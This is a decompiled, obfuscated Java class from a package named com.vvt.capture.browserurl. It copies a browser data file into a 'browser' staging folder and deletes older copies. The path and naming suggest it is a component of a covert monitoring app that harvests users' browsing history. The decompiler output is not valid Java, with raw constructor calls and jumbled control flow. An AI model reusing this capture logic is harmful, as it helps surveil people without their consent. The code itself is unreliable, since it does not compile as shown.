package com.vvt.capture.browserurl.a;

import com.vvt.ag.b;
import com.vvt.io.d;
import com.vvt.io.p;
import java.io.File;

public class a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  public static String a(String paramString1, String paramString2)
  {
    boolean bool1 = false;
    Object localObject1 = null;
    Object localObject2 = new java/io/File;
    ((File)localObject2).<init>(paramString1);
    boolean bool2 = ((File)localObject2).exists();
    Object localObject3;
    if (bool2)
    {
      localObject2 = new java/io/File;
      ((File)localObject2).<init>(paramString1);
      localObject2 = ((File)localObject2).getName();
      localObject3 = b(paramString2);
      localObject2 = p.a((String)localObject3, (String)localObject2);
    }
    for (;;)
    {
      try
      {
        File localFile = new java/io/File;
        localFile.<init>((String)localObject3);
        boolean bool3 = localFile.exists();
        if (!bool3) {
          localFile.mkdirs();
        }
        localObject3 = new java/io/File;
        ((File)localObject3).<init>((String)localObject2);
        boolean bool4 = ((File)localObject3).exists();
        if (bool4) {
          ((File)localObject3).delete();
        }
        d.a(paramString1, (String)localObject2);
        localObject3 = new java/io/File;
        ((File)localObject3).<init>((String)localObject2);
        bool3 = ((File)localObject3).exists();
        if (bool3) {
          continue;
        }
        bool2 = b;
        if (!bool2) {}
      }
      catch (Exception localException)
      {
        bool2 = b;
        if (!bool2) {
          continue;
        }
        continue;
      }
      return (String)localObject1;
      bool1 = a;
      if (bool1) {}
      localObject1 = localObject2;
      continue;
      bool2 = a;
      if (!bool2) {}
    }
  }
  
  public static void a(String paramString)
  {
    boolean bool1 = b.a(paramString);
    if (!bool1)
    {
      File localFile = new java/io/File;
      localFile.<init>(paramString);
      boolean bool2 = localFile.exists();
      if (bool2) {
        localFile.delete();
      }
    }
  }
  
  private static String b(String paramString)
  {
    return p.a(paramString, "browser");
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/browserurl/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */